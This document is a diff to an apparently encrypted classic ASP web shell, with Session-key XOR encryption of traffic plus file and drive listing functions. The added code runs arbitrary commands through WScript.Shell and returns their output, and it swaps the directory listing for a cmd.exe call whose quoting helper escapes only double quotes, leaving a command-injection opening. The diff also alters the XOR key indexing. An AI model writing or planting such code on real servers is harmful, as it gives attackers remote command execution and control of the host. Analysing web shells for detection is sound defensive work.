@@ -36,7 +36,7 @@ Function Encrypt(data)
 key=Session("k")
 size=len(data)
 For i=1 To size
-encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,(i and 15)+5,1)))
+encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,((i - 1 + 5) And 15)+1,1)))
 Next
 Encrypt=encryptResult
 End Function
@@ -73,29 +73,25 @@ Function getStr(file)
 	getStr=filename&chr(9)&file.size&chr(9)&attrstr&chr(9)&lastModified&chr(10)
 End Function
 Dim fso
+Function ShellQuote(value)
+	ShellQuote = """" & Replace(value, """", """""") & """"
+End Function
+
+Function RunCommand(command)
+	On Error Resume Next
+	Dim ws, process, outputText
+	Set ws = Server.CreateObject("WScript.Shell")
+	Set process = ws.Exec(command)
+	outputText = process.StdOut.ReadAll & process.StdErr.ReadAll
+	If Err.Number <> 0 Then
+		outputText = Err.Description
+		Err.Clear
+	End If
+	RunCommand = outputText
+End Function
+
 Function list(path)
-on error resume next
-Dim listResult
-Dim fs,sa
-Set fso=server.createobject("Scripting.FileSystemObject")
-If IsEmpty(fso) Then
-Set fso=server.createobject("shell.application")
-End If
-
-Set pathObj = fso.GetFolder(path)
-Set fsofolders = pathObj.SubFolders
-Set fsofile = pathObj.Files
-For Each folder in fsofolders
-	line=getStr(folder)
-	listResult=listResult&line
-Next
-
-For Each file in fsofile
-	line=getStr(file)
-	listResult=listResult&line
-Next 
-list=listResult
-Set fso=Nothing
+	list = RunCommand("cmd.exe /c dir /b /a " & ShellQuote(path))
 End Function
 
 Function driveList()
